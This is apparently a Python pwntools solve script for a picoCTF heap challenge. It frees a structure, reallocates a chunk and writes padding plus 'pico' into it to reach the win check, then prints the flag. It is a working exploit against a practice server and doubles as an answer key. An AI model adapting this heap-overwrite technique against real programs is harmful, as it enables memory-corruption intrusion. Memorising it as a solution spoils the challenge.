#!/usr/bin/env python
#!CMD: ./solve.py

## Great beginners-guide on how to use the pwntools-library:  https://nobinpegasus.github.io/blog/a-beginners-guide-to-pwntools/

from pwn import *

p = remote("tethys.picoctf.net", 61955)


## Free `x`
p.sendline(b"5")

## Allocate memory and write to it
p.sendline(b"2")
payload = f"{"A"*30}pico"                    # We need to pad our payload with 'A'*30 since the flag comes after a, b, and c in the memory-structure (see ./original_files/chall.c)
p.sendline(str(len(payload)+1).encode())     # Allocate a bit more than the size of our payload
p.sendline(payload.encode())

# p.sendline(b"3")

## Check for win
p.sendline(b"4")

## Recieve output
p.recvuntil(b"YOU WIN!!11!!\n")
print(p.recvall().decode())

# p.interactive()
